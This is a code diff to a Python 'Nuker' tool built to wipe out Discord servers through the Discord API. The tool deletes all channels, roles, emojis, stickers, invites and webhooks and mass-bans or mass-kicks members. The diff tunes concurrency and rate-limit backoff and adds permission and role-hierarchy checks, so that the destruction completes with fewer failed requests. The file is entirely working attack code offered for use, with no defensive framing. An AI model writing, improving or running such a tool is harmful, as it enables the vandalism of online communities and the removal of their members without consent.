@@ -30,32 +30,41 @@ Lime = "\033[38;5;154m"
 
 ApiBase = "https://discord.com/api/v10"
 MaxRetries = 5
-InitialWorkers = 50
-MinWorkers = 25
-MaxWorkers = 50
-JitterMin = 0.001
-JitterMax = 0.005
-BackoffBase = 0.05
-BackoffMax = 1.5
-ConnectTimeout = 3.0
+InitialWorkers = 24
+MinWorkers = 12
+MaxWorkers = 40
+JitterMin = 0.003
+JitterMax = 0.020
+BackoffBase = 0.10
+BackoffMax = 2.5
+ConnectTimeout = 3.5
 ReadTimeout = 10.0
 WriteTimeout = 10.0
-PoolTimeout = 3.0
-MaxConnections = 200
-MaxKeepalive = 100
-KeepaliveExpiry = 60.0
-ProgressInterval = 0.25
-AutotuneInterval = 1.0
+PoolTimeout = 3.5
+MaxConnections = 120
+MaxKeepalive = 60
+KeepaliveExpiry = 30.0
+ProgressInterval = 0.35
+AutotuneInterval = 1.2
 AutotuneLogCooldown = 8.0
 MemberPageSize = 1000
 MaxConsecutiveMemberErrors = 3
 GlobalRateLimitCap = 90.0
 QueueGetTimeout = 1.0
-WorkerStaggerMax = 0.05
-AutotuneUpStep = 5
-AutotuneDownFactor = 0.8
+WorkerStaggerMax = 0.04
+AutotuneUpStep = 3
+AutotuneDownFactor = 0.75
 AutotuneRateLimitThreshold = 0.25
 AutotuneSuccessThreshold = 15
+
+PermKickMembers = 1 << 1
+PermBanMembers = 1 << 2
+PermAdministrator = 1 << 3
+PermManageChannels = 1 << 4
+PermManageGuild = 1 << 5
+PermManageRoles = 1 << 28
+PermManageWebhooks = 1 << 29
+PermManageGuildExpressions = 1 << 30
 
 Stats: Dict[str, Any] = {
     "Done": 0,
@@ -229,6 +238,12 @@ class Nuker:
         self.Permissions: int = 0
         self.IsOwner: bool = False
         self.IsAdmin: bool = False
+        self.UserHighestRolePosition: int = -1
+        self.UserRoleIds: set = set()
+        self.RolePositions: Dict[str, int] = {}
+        self.RoleCache: Dict[str, Dict[str, Any]] = {}
+        self.MemberHighestCache: Dict[str, int] = {}
+        self.GuildOwnerId: Optional[str] = None
 
     async def __aenter__(self) -> "Nuker":
         self.Queue = asyncio.Queue()
@@ -315,7 +330,7 @@ class Nuker:
                 self.Permissions = 0
                 self.IsAdmin = False
                 return True
-            MyRoles = set(SafeGet(Member, "roles", []))
+            MyRoles = set(SafeGet(Member, "roles", []) or [])
             Accumulated = 0
             for Role in AllRoles:
                 if not isinstance(Role, dict):
@@ -327,10 +342,113 @@ class Nuker:
                 if RoleId == self.GuildId or RoleId in MyRoles:
                     Accumulated |= RolePerms
             self.Permissions = Accumulated
-            self.IsAdmin = bool(Accumulated & 0x8)
+            self.IsAdmin = bool(Accumulated & PermAdministrator)
             return True
         except Exception:
             return False
+
+    async def LoadHierarchy(self) -> bool:
+        try:
+            if not self.User or not self.Guild:
+                return False
+            self.GuildOwnerId = SafeGet(self.Guild, "owner_id")
+            MyId = SafeGet(self.User, "id")
+            if not MyId:
+                return False
+            RolesResp = await self.Request("GET", f"{ApiBase}/guilds/{self.GuildId}/roles")
+            if RolesResp is None or RolesResp.status_code != 200:
+                return False
+            Roles = SafeJson(RolesResp)
+            if not isinstance(Roles, list):
+                return False
+            self.RolePositions.clear()
+            self.RoleCache.clear()
+            for Role in Roles:
+                if not isinstance(Role, dict):
+                    continue
+                Rid = SafeGet(Role, "id")
+                if not Rid:
+                    continue
+                self.RolePositions[Rid] = SafeInt(SafeGet(Role, "position", 0), 0)
+                self.RoleCache[Rid] = Role
+            MemberResp = await self.Request(
+                "GET", f"{ApiBase}/guilds/{self.GuildId}/members/{MyId}"
+            )
+            if MemberResp is None or MemberResp.status_code != 200:
+                return False
+            Member = SafeJson(MemberResp)
+            if not isinstance(Member, dict):
+                return False
+            self.UserRoleIds = set(SafeGet(Member, "roles", []) or [])
+            Highest = 0
+            for Rid in self.UserRoleIds:
+                Highest = max(Highest, self.RolePositions.get(Rid, 0))
+            if MyId == self.GuildOwnerId:
+                self.UserHighestRolePosition = 1 << 30
+            else:
+                self.UserHighestRolePosition = Highest
+            return True
+        except Exception:
+            return False
+
+    def HasPerm(self, Flag: int) -> bool:
+        if self.Permissions & PermAdministrator:
+            return True
+        return bool(self.Permissions & Flag)
+
+    def IsGuildOwner(self) -> bool:
+        return bool(
+            self.User
+            and self.Guild
+            and SafeGet(self.User, "id") == SafeGet(self.Guild, "owner_id")
+        )
+
+    def CanManageRole(self, RoleId: str) -> Tuple[bool, str]:
+        if not self.HasPerm(PermManageRoles):
+            return False, "Missing Manage Roles"
+        Role = self.RoleCache.get(RoleId)
+        if not Role:
+            return False, "Role Not Cached"
+        if SafeGet(Role, "managed", False):
+            return False, "Role Is Managed"
+        if RoleId == self.GuildId:
+            return False, "Cannot Modify @everyone"
+        if self.IsGuildOwner():
+            return True, ""
+        TargetPos = self.RolePositions.get(RoleId, 0)
+        if TargetPos >= self.UserHighestRolePosition:
+            return False, f"Role Position {TargetPos} >= User {self.UserHighestRolePosition}"
+        return True, ""
+
+    def GetMemberHighestPosition(self, Member: Dict[str, Any]) -> int:
+        UserId = SafeGet(SafeGet(Member, "user", {}), "id")
+        if UserId == self.GuildOwnerId:
+            return 1 << 30
+        Roles = SafeGet(Member, "roles", []) or []
+        Highest = 0
+        for Rid in Roles:
+            Highest = max(Highest, self.RolePositions.get(Rid, 0))
+        return Highest
+
+    def CanManageMember(self, Member: Dict[str, Any]) -> Tuple[bool, str]:
+        UserId = SafeGet(SafeGet(Member, "user", {}), "id")
+        if not UserId:
+            return False, "Missing User Id"
+        if UserId == self.GuildOwnerId:
+            return False, "Target Is Guild Owner"
+        if UserId == SafeGet(self.User, "id"):
+            return False, "Target Is Self"
+        if self.IsGuildOwner():
+            return True, ""
+        TargetPos = self.GetMemberHighestPosition(Member)
+        if TargetPos >= self.UserHighestRolePosition:
+            return False, f"Member Position {TargetPos} >= User {self.UserHighestRolePosition}"
+        return True, ""
+
+    def CacheMemberPosition(self, Member: Dict[str, Any]) -> None:
+        Uid = SafeGet(SafeGet(Member, "user", {}), "id")
+        if Uid:
+            self.MemberHighestCache[Uid] = self.GetMemberHighestPosition(Member)
 
     async def ValidateAll(self) -> bool:
         SafePrint("")
@@ -370,6 +488,10 @@ class Nuker:
             SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Permissions: Could Not Fetch{Reset}")
             SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
             return False
+        if not await self.LoadHierarchy():
+            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Hierarchy: Could Not Load{Reset}")
+            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
+            return False
         if self.IsOwner:
             SafePrint(f"{Purple}│{Reset} {BrightGreen}✔ Permissions: {Teal}{Bold}Owner{Reset}")
         elif self.IsAdmin:
@@ -377,8 +499,36 @@ class Nuker:
         else:
             SafePrint(
                 f"{Purple}│{Reset} {BrightYellow}⚠ Permissions: "
-                f"{Teal}{Bold}Limited (0x{self.Permissions:X}){Reset}"
+                f"{Teal}{Bold}Limited{Reset}"
             )
+        Checks = [
+            ("Manage Channels", PermManageChannels),
+            ("Manage Roles", PermManageRoles),
+            ("Manage Guild", PermManageGuild),
+            ("Manage Webhooks", PermManageWebhooks),
+            ("Manage Expressions", PermManageGuildExpressions),
+            ("Ban Members", PermBanMembers),
+            ("Kick Members", PermKickMembers),
+        ]
+        Granted = [Name for Name, Flag in Checks if self.HasPerm(Flag)]
+        Missing = [Name for Name, Flag in Checks if not self.HasPerm(Flag)]
+        SafePrint(
+            f"{Purple}│{Reset} {BrightGreen}✔ Granted:{Reset} "
+            f"{Teal}{', '.join(Granted) or 'None'}{Reset}"
+        )
+        if Missing:
+            SafePrint(
+                f"{Purple}│{Reset} {BrightYellow}⚠ Missing:{Reset} "
+                f"{Gray}{', '.join(Missing)}{Reset}"
+            )
+        if self.IsOwner:
+            HierLabel = "Owner (Infinity)"
+        else:
+            HierLabel = f"Position {self.UserHighestRolePosition}"
+        SafePrint(
+            f"{Purple}│{Reset} {BrightBlue}⌂ Hierarchy:{Reset} "
+            f"{Teal}{HierLabel}{Reset}"
+        )
         SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
         return True
 
@@ -505,6 +655,7 @@ class Nuker:
                 return
             for Member in Batch:
                 if isinstance(Member, dict):
+                    self.CacheMemberPosition(Member)
                     yield Member
             try:
                 LastUserId = Batch[-1]["user"]["id"]
@@ -691,6 +842,9 @@ async def ProgressReporter(Total: int) -> None:
 
 
 async def DeleteChannels(NukerInstance: Nuker) -> int:
+    if not NukerInstance.HasPerm(PermManageChannels):
+        ErrorBox("Missing Manage Channels Permission")
+        return 0
     Channels = await NukerInstance.GetChannels()
     if not Channels:
         ErrorBox("No Channels Found")
@@ -710,29 +864,47 @@ async def DeleteChannels(NukerInstance: Nuker) -> int:
 
 
 async def DeleteRoles(NukerInstance: Nuker) -> int:
+    if not NukerInstance.HasPerm(PermManageRoles):
+        ErrorBox("Missing Manage Roles Permission")
+        return 0
     Roles = await NukerInstance.GetRoles()
     if not Roles:
         ErrorBox("No Roles Found")
         return 0
     Count = 0
+    Skipped = 0
     for Role in Roles:
         RoleId = SafeGet(Role, "id")
-        if not RoleId or SafeGet(Role, "managed") or RoleId == NukerInstance.GuildId:
+        if not RoleId or RoleId == NukerInstance.GuildId:
+            continue
+        Ok, Reason = NukerInstance.CanManageRole(RoleId)
+        if not Ok:
+            Skipped += 1
             continue
         NukerInstance.Queue.put_nowait(
             ("DELETE", f"{ApiBase}/guilds/{NukerInstance.GuildId}/roles/{RoleId}", None)
         )
         Count += 1
+    if Skipped:
+        WarningBox(f"Skipped {Skipped} Roles (Hierarchy)")
+    if Count == 0:
+        ErrorBox("No Eligible Roles Found")
     return Count
 
 
 async def BanMembers(NukerInstance: Nuker) -> int:
-    MyId = SafeGet(NukerInstance.User, "id")
-    OwnerId = SafeGet(NukerInstance.Guild, "owner_id")
+    if not NukerInstance.HasPerm(PermBanMembers):
+        ErrorBox("Missing Ban Members Permission")
+        return 0
     Count = 0
+    Skipped = 0
     async for Member in NukerInstance.IterMembers():
+        Ok, Reason = NukerInstance.CanManageMember(Member)
+        if not Ok:
+            Skipped += 1
+            continue
         UserId = SafeGet(SafeGet(Member, "user", {}), "id")
-        if not UserId or UserId == MyId or UserId == OwnerId:
+        if not UserId:
             continue
         NukerInstance.Queue.put_nowait(
             (
@@ -742,29 +914,42 @@ async def BanMembers(NukerInstance: Nuker) -> int:
             )
         )
         Count += 1
+    if Skipped:
+        WarningBox(f"Skipped {Skipped} Members (Hierarchy)")
     if Count == 0:
-        ErrorBox("No Members Found")
+        ErrorBox("No Eligible Members Found")
     return Count
 
 
 async def KickMembers(NukerInstance: Nuker) -> int:
-    MyId = SafeGet(NukerInstance.User, "id")
-    OwnerId = SafeGet(NukerInstance.Guild, "owner_id")
+    if not NukerInstance.HasPerm(PermKickMembers):
+        ErrorBox("Missing Kick Members Permission")
+        return 0
     Count = 0
+    Skipped = 0
     async for Member in NukerInstance.IterMembers():
+        Ok, Reason = NukerInstance.CanManageMember(Member)
+        if not Ok:
+            Skipped += 1
+            continue
         UserId = SafeGet(SafeGet(Member, "user", {}), "id")
-        if not UserId or UserId == MyId or UserId == OwnerId:
+        if not UserId:
             continue
         NukerInstance.Queue.put_nowait(
             ("DELETE", f"{ApiBase}/guilds/{NukerInstance.GuildId}/members/{UserId}", None)
         )
         Count += 1
+    if Skipped:
+        WarningBox(f"Skipped {Skipped} Members (Hierarchy)")
     if Count == 0:
-        ErrorBox("No Members Found")
+        ErrorBox("No Eligible Members Found")
     return Count
 
 
 async def DeleteEmojis(NukerInstance: Nuker) -> int:
+    if not NukerInstance.HasPerm(PermManageGuildExpressions):
+        ErrorBox("Missing Manage Expressions Permission")
+        return 0
     Response = await NukerInstance.Request("GET", f"{ApiBase}/guilds/{NukerInstance.GuildId}/emojis")
     if not Response or Response.status_code != 200:
         return 0
@@ -785,6 +970,9 @@ async def DeleteEmojis(NukerInstance: Nuker) -> int:
 
 
 async def DeleteStickers(NukerInstance: Nuker) -> int:
+    if not NukerInstance.HasPerm(PermManageGuildExpressions):
+        ErrorBox("Missing Manage Expressions Permission")
+        return 0
     Response = await NukerInstance.Request("GET", f"{ApiBase}/guilds/{NukerInstance.GuildId}/stickers")
     if not Response or Response.status_code != 200:
         return 0
@@ -805,6 +993,9 @@ async def DeleteStickers(NukerInstance: Nuker) -> int:
 
 
 async def DeleteInvites(NukerInstance: Nuker) -> int:
+    if not NukerInstance.HasPerm(PermManageGuild):
+        ErrorBox("Missing Manage Guild Permission")
+        return 0
     Response = await NukerInstance.Request("GET", f"{ApiBase}/guilds/{NukerInstance.GuildId}/invites")
     if not Response or Response.status_code != 200:
         return 0
@@ -823,6 +1014,9 @@ async def DeleteInvites(NukerInstance: Nuker) -> int:
 
 
 async def DeleteWebhooks(NukerInstance: Nuker) -> int:
+    if not NukerInstance.HasPerm(PermManageWebhooks):
+        ErrorBox("Missing Manage Webhooks Permission")
+        return 0
     Response = await NukerInstance.Request("GET", f"{ApiBase}/guilds/{NukerInstance.GuildId}/webhooks")
     if not Response or Response.status_code != 200:
         return 0
